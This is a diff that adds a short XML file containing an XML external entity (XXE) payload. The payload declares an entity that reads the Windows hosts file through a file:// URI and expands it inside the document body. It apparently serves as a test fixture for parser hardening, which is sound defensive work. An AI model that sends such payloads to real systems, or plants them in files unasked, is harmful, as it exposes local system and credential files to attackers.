@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY secret SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+]>
+<root>
+  <data>&secret;</data>
+</root>
